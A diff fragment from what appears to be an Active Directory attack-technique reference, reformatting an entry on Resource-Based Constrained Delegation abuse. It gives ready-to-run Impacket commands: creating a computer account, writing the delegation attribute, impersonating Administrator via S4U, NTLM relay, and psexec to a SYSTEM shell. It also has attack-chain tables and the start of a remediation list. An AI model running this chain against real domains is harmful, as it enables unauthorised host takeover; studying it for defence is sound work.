-        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write that attribute — through an ACL you hold or a relayed LDAP session — pointing it at an account you control, then impersonate any user to the target.\n\nImpact: because a normal user can create computer accounts by default (MachineAccountQuota = 10), and write access to a computer object is common, the whole chain is frequently achievable from a low-privilege foothold, ending in full takeover of the target host.",
-        quickReference: [
-          { label: "Create a computer account you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
-          { label: "Write RBCD on the target", cmd: "rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
-          { label: "Impersonate Administrator to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:'Pass123!'" },
-          { label: "Set up via NTLM relay instead", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
+        "id": "rbcd",
+        "name": "Resource-Based Constrained Delegation (RBCD)",
+        "severity": "High",
+        "ref": "https://attack.mitre.org/techniques/T1134/",
+        "theory": "theory/2026-08-18-delegation.html",
+        "description": "Write access to a computer object lets an attacker configure delegation onto it and impersonate any user to that host — often achievable from a plain foothold.",
+        "brief": "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write that attribute — through an ACL you hold or a relayed LDAP session — pointing it at an account you control, then impersonate any user to the target.\n\nImpact: because a normal user can create computer accounts by default (MachineAccountQuota = 10), and write access to a computer object is common, the whole chain is frequently achievable from a low-privilege foothold, ending in full takeover of the target host.",
+        "quickReference": [
+          {
+            "label": "Create a computer account you control",
+            "cmd": "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'"
+          },
+          {
+            "label": "Write RBCD on the target",
+            "cmd": "rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'"
+          },
+          {
+            "label": "Impersonate Administrator to the target",
+            "cmd": "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:'Pass123!'"
+          },
+          {
+            "label": "Set up via NTLM relay instead",
+            "cmd": "ntlmrelayx.py -t ldap://dc01 --delegate-access"
+          }
         ],
-        sections: [
+        "sections": [
           {
-            title: "How It's Exploited",
-            type: "commands",
-            commands: [
-              { label: "1. Confirm you can write the target computer's attributes", cmd: "# BloodHound: GenericWrite / GenericAll / WriteAccountRestrictions over TARGET$\n# any of these lets you write msDS-AllowedToActOnBehalfOfOtherIdentity" },
-              { label: "2. Create a controlled account with an SPN (a computer account has one)", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   MachineAccountQuota (default 10) lets any user create up to 10 of these" },
-              { label: "3. Point the target's RBCD attribute at your account", cmd: "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ to trust EVIL$" },
-              { label: "4. Impersonate a privileged user to the target via S4U", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator \\\n  corp.local/EVIL$:'Pass123!'\n#   -spn cifs/target   the service on the target you want\n#   -impersonate       any user, e.g. Administrator\n# yields Administrator@cifs_target.ccache" },
-              { label: "5. Use it", cmd: "export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'\npsexec.py -k -no-pass target.corp.local   # SYSTEM shell on the target" }
+            "title": "How It's Exploited",
+            "type": "commands",
+            "commands": [
+              {
+                "label": "1. Confirm you can write the target computer's attributes",
+                "cmd": "# BloodHound: GenericWrite / GenericAll / WriteAccountRestrictions over TARGET$\n# any of these lets you write msDS-AllowedToActOnBehalfOfOtherIdentity"
+              },
+              {
+                "label": "2. Create a controlled account with an SPN (a computer account has one)",
+                "cmd": "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   MachineAccountQuota (default 10) lets any user create up to 10 of these"
+              },
+              {
+                "label": "3. Point the target's RBCD attribute at your account",
+                "cmd": "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ to trust EVIL$"
+              },
+              {
+                "label": "4. Impersonate a privileged user to the target via S4U",
+                "cmd": "getST.py -spn cifs/target.corp.local -impersonate Administrator \\\n  corp.local/EVIL$:'Pass123!'\n#   -spn cifs/target   the service on the target you want\n#   -impersonate       any user, e.g. Administrator\n# yields Administrator@cifs_target.ccache"
+              },
+              {
+                "label": "5. Use it",
+                "cmd": "export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'\npsexec.py -k -no-pass target.corp.local   # SYSTEM shell on the target"
+              }
             ]
           },
           {
-            title: "Attack Chain",
-            type: "table",
-            columns: ["Step", "Action", "Result"],
-            rows: [
-              ["1", "Gain write over a computer object (ACL or relay)", "Ability to set RBCD on the target"],
-              ["2", "Create/own an account with an SPN", "Principal that can be delegated from"],
-              ["3", "Write msDS-AllowedToActOnBehalfOfOtherIdentity", "Target now trusts your account to delegate"],
-              ["4", "S4U2Self + S4U2Proxy as Administrator", "Service ticket to the target as admin"],
-              ["5", "PsExec / secretsdump to the target", "SYSTEM on the host"]
+            "title": "How resource-based delegation is abused",
+            "type": "table",
+            "columns": [
+              "Mechanism",
+              "Why it enables the attack"
+            ],
+            "rows": [
+              [
+                "RBCD lives on the target resource",
+                "msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer names which accounts may impersonate users to it"
+              ],
+              [
+                "Writing that attribute grants impersonation",
+                "Whoever can write it names an account they control as trusted-to-delegate — the target then accepts S4U from it"
+              ],
+              [
+                "S4U2self + S4U2proxy forge the ticket",
+                "The controlled account requests a ticket \"to itself as Administrator\", then exchanges it for a usable service ticket to the target"
+              ],
+              [
+                "MachineAccountQuota supplies the principal",
+                "By default any user may add 10 computer accounts, so the SPN-bearing account you need is free to create"
+              ],
+              [
+                "Write access is a common finding",
+                "GenericWrite/GenericAll over a computer object, or a relayed LDAP session, is a frequent low-priv path — so the chain starts from a foothold"
+              ]
             ]
           },
           {
-            title: "Tools Used",
-            type: "table",
-            columns: ["Tool", "Purpose"],
-            rows: [
-              ["Impacket addcomputer.py", "Create a controlled computer account"],
-              ["Impacket rbcd.py / bloodyAD", "Write the RBCD attribute on the target"],
-              ["Impacket getST.py", "S4U impersonation to obtain the ticket"],
-              ["ntlmrelayx.py", "--delegate-access to configure RBCD via a relayed LDAP session"],
-              ["BloodHound", "Find write access over computer objects"]
+            "title": "Attack Chain",
+            "type": "table",
+            "columns": [
+              "Step",
+              "Action",
+              "Result"
+            ],
+            "rows": [
+              [
+                "1",
+                "Gain write over a computer object (ACL or relay)",
+                "Ability to set RBCD on the target"
+              ],
+              [
+                "2",
+                "Create/own an account with an SPN",
+                "Principal that can be delegated from"
+              ],
+              [
+                "3",
+                "Write msDS-AllowedToActOnBehalfOfOtherIdentity",
+                "Target now trusts your account to delegate"
+              ],
+              [
+                "4",
+                "S4U2Self + S4U2Proxy as Administrator",
+                "Service ticket to the target as admin"
+              ],
+              [
+                "5",
+                "PsExec / secretsdump to the target",
+                "SYSTEM on the host"
+              ]
             ]
           },
           {
-            title: "References",
-            type: "references",
-            items: [
-              { label: "Hadess — Pwning the Domain: Kerberos Delegation (RBCD)", url: "https://hadess.io/" },
-              { label: "Elad Shamir — Wagging the Dog (RBCD)", url: "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" },
-              { label: "The Hacker Recipes — RBCD", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" }
+            "title": "Tools Used",
+            "type": "table",
+            "columns": [
+              "Tool",
+              "Purpose"
+            ],
+            "rows": [
+              [
+                "Impacket addcomputer.py",
+                "Create a controlled computer account"
+              ],
+              [
+                "Impacket rbcd.py / bloodyAD",
+                "Write the RBCD attribute on the target"
+              ],
+              [
+                "Impacket getST.py",
+                "S4U impersonation to obtain the ticket"
+              ],
+              [
+                "ntlmrelayx.py",
+                "--delegate-access to configure RBCD via a relayed LDAP session"
+              ],
+              [
+                "BloodHound",
+                "Find write access over computer objects"
+              ]
             ]
           },
           {
-            title: "Remediation",
-            type: "notes",
-            items: [
+            "title": "References",
+            "type": "references",
+            "items": [
+              {
+                "label": "Hadess — Pwning the Domain: Kerberos Delegation (RBCD)",
+                "url": "https://hadess.io/"
+              },
+              {
+                "label": "Elad Shamir — Wagging the Dog (RBCD)",
+                "url": "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"
+              },
+              {
+                "label": "The Hacker Recipes — RBCD",
+                "url": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
+              }
+            ]
+          },
+          {
+            "title": "Remediation",
+            "type": "notes",
+            "items": [
               "Set MachineAccountQuota to 0 so ordinary users cannot create the computer account the chain needs.",
               "Audit and tighten ACLs on computer objects; GenericWrite/GenericAll for non-admins is the enabling condition.",
               "Enforce LDAP signing and channel binding to close the relay route into RBCD setup.",
